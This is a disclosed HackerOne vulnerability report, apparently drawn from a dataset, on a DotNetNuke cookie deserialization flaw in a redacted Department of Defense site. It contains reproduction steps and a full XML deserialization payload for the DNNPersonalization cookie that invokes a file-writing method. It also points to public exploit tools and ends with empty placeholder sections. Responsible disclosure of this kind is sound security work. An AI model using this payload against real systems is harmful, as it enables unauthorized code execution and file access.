---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '876708'
original_report_id: '876708'
title: Remote Code Execution through DNN Cookie Deserialization
weakness: OS Command Injection
team_handle: deptofdefense
created_at: '2020-05-17T20:13:54.706Z'
disclosed_at: '2020-05-27T14:06:11.705Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 56
tags:
- hackerone
- os-command-injection
---

# Remote Code Execution through DNN Cookie Deserialization

## Metadata

- HackerOne Report ID: 876708
- Weakness: OS Command Injection
- Program: deptofdefense
- Disclosed At: 2020-05-27T14:06:11.705Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
The application at ```https://████████``` presents a deserialization vulnerability that permits RCE and file read/write

## Step-by-step Reproduction Instructions

1. Navigate to a random page that must return a 404 Error status like ```https://████/test```
2. Add this cookie in the request header: ```DNNPersonalization```
3. Insert the payload into the ```DNNPersonalization``` cookie. You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the system:

```
<profile>
<item key="name1:key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<ExpandedElement/>
<ProjectedProperty0>
<MethodName>WriteFile</MethodName>
<MethodParameters>
<anyType xsi:type="xsd:string">test</anyType>
</MethodParameters>
<ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance>
</ProjectedProperty0>
</ExpandedWrapperOfFileSystemUtilsObjectDataProvider>
</item>
</profile>
```

Where ```test``` is the wanted file

Expected result:
████


## Product, Version, and Configuration (If applicable)
Platform: https://████████/shell.aspx
Vulnerable Product: DotNetNuke
Vulnerable Version: < 9.3.0-RC


## Suggested Mitigation/Remediation Actions
Update the DotNetNuke (DNN) product to the latest version or to a more recent version that is not vulnerable

## Impact

An attacker can execute remote commands on the system and gain unauthorized access to it.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
